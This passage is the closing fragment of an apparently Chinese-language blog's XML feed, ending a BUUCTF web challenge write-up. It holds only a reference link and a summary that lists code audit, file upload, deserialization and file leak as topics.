alt="image-20210826233218385"></p><p>连接后在根目录找到flag</p><p>参考文章:<br><a href="https://blog.csdn.net/qq_41891666/article/details/107382969">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;代码审计、文件上传、反序列化、文件泄露&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
</feed>
